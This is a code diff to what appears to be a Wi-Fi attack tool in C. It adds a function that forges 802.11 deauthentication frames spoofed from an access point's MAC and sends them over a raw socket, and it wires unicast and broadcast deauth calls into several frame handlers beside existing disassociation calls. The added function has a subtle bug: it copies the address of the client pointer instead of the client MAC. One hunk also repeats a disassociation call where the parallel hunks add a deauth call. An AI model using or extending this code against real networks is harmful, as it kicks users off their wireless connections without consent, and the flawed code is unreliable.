@@ -1577,6 +1577,48 @@ outgoingcount++;
 return;
 }
 /*===========================================================================*/
+static void send_deauthentication(uint8_t *macclient, uint8_t *macap, uint8_t reason)
+{
+static mac_t *macftx;
+static maclist_t *zeiger;
+
+if((attackstatus &DISABLE_DEAUTHENTICATION) == DISABLE_DEAUTHENTICATION) return;
+if(filtermode == 1)
+	{
+	if(isapinfilterlist(macap) == true) return;
+	}
+else if(filtermode ==2)
+	{
+	if(isapinfilterlist(macap) == false) return;
+	}
+for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
+	{
+	if(memcmp(zeiger->addr, macap, 6) != 0) continue;
+	if(zeiger->status > NET_M2) return;
+	}
+packetoutptr = epbown +EPB_SIZE;
+memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
+memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
+macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
+macftx->type = IEEE80211_FTYPE_MGMT;
+macftx->subtype = IEEE80211_STYPE_DEAUTH;
+memcpy(macftx->addr1, &macclient, 6);
+memcpy(macftx->addr2, macap, 6);
+memcpy(macftx->addr3, macap, 6);
+macftx->duration = 0x013a;
+macftx->sequence = mydeauthenticationsequence++ << 4;
+if(mydeauthenticationsequence >= 4096) mydeauthenticationsequence = 1;
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
+if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_NORM +2) < 0)
+	{
+	perror("\nfailed to transmit deuthentication");
+	errorcount++;
+	}
+fsync(fd_socket);
+outgoingcount++;
+return;
+}
+/*===========================================================================*/
 static void send_deauthentication_broadcast(uint8_t *macap, uint8_t reason)
 {
 static mac_t *macftx;
@@ -2642,12 +2684,16 @@ if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
 	{
 	send_ack();
 	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+	send_deauthentication(macfrx->addr2, macfrx->addr1, WLAN_REASON_UNSPECIFIED);
+	send_deauthentication_broadcast(macfrx->addr1, WLAN_REASON_UNSPECIFIED);
 	return;
 	}
 if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
 	{
 	send_ack();
 	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+	send_deauthentication(macfrx->addr1, macfrx->addr2, WLAN_REASON_UNSPECIFIED);
+	send_deauthentication_broadcast(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
 	}
 return;
 }
@@ -2690,12 +2736,16 @@ if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
 	{
 	send_ack();
 	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+	send_deauthentication(macfrx->addr2, macfrx->addr1, WLAN_REASON_UNSPECIFIED);
+	send_deauthentication_broadcast(macfrx->addr1, WLAN_REASON_UNSPECIFIED);
 	return;
 	}
 if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
 	{
 	send_ack();
 	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+	send_deauthentication_broadcast(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
 	}
 return;
 }
@@ -2756,18 +2806,16 @@ if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
 	{
 	send_ack();
 	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
-	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
-	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
-	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+	send_deauthentication(macfrx->addr2, macfrx->addr1, WLAN_REASON_UNSPECIFIED);
+	send_deauthentication_broadcast(macfrx->addr1, WLAN_REASON_UNSPECIFIED);
 	return;
 	}
 if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
 	{
 	send_ack();
 	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
-	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
-	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
-	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+	send_deauthentication(macfrx->addr1, macfrx->addr2, WLAN_REASON_UNSPECIFIED);
+	send_deauthentication_broadcast(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
 	}
 return;
 }
